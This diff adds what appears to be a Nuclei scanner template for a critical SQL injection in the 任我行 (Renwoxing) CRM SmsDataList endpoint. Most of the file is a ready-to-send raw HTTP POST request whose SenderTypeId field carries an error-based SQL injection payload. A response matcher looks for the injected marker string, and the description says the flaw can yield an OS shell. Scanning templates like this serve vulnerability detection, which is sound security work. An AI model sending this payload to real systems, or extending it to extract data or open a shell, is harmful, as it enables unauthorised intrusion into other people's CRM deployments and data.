@@ -1,0 +1,21 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - part: body
+          type: word
+          words:
+            - qxkjq1qxvpq
+      matchers-condition: and
+      raw:
+        - "POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 \n\nKeywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=00000000'+AND+5952+IN+(SELECT+(CHAR(113)%2bCHAR(120)%2bCHAR(107)%2bCHAR(106)%2bCHAR(113)%2b(SELECT+(CASE+WHEN+(5952%3d5952)+THEN+CHAR(49)+ELSE+CHAR(48)+END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(118)%2bCHAR(112)%2bCHAR(113)))--+fKAv\n"
+id: renwoxing-crm-SmsDataList-sqli
+info:
+    author: H0nayuzu
+    description: 任我行CRM SmsDataList - SQL注入 可os-shell
+    name: 任我行CRM SmsDataList - SQL injection
+    severity: critical
+    tags:
+        - crm
+        - 任我行crm
